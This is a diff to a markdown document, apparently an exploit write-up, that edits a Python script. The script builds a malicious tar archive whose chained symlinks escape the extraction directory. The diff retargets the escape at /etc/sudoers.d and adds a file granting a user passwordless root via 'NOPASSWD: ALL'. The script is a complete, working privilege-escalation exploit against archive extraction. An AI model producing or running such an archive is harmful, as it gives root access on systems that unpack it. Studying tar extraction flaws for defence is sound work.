@@ -1128,42 +1128,39 @@ if __name__ == "__main__":
 ```python
 import tarfile
 import os
-import io
-import sys
 
-# Fixed the syntax on these variables
-comp = 'd' * 247 
+comp = 'd' * 247
 steps = "abcdefghijklmnop"
 path = ""
 
-with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
+with tarfile.open("backup_9999.tar", mode="w") as tar:
     for i in steps:
-        # Create directory entry
         a = tarfile.TarInfo(os.path.join(path, comp))
         a.type = tarfile.DIRTYPE
         tar.addfile(a)
-
-        # Create symlink entry
         b = tarfile.TarInfo(os.path.join(path, i))
         b.type = tarfile.SYMTYPE
         b.linkname = comp
         tar.addfile(b)
-
         path = os.path.join(path, comp)
-
-    # Creating the deep link path
-    linkpath = os.path.join("/".join(steps), "l" * 254)
-    
+        
+    linkpath = os.path.join("/".join(steps), "l"*254)
     l = tarfile.TarInfo(linkpath)
     l.type = tarfile.SYMTYPE
     l.linkname = "../" * len(steps)
     tar.addfile(l)
-
-    # The escape symlink to target /etc or other root files
+    
+    # This points 'escape' to /etc/sudoers.d via the symlink tunnel
     e = tarfile.TarInfo("escape")
     e.type = tarfile.SYMTYPE
-    e.linkname = linkpath + "/../../../../../../../etc"
+    e.linkname = linkpath + "/../../../../../../../etc/sudoers.d"
     tar.addfile(e)
+
+    # Finally, add the exploit file into the 'escape' path
+    payload = "wacky ALL=(ALL) NOPASSWD: ALL\n"
+    with open("pwn", "w") as f:
+        f.write(payload)
+    tar.add("pwn", arcname="escape/pwn")
 ```
 <div align="center">
 <br>
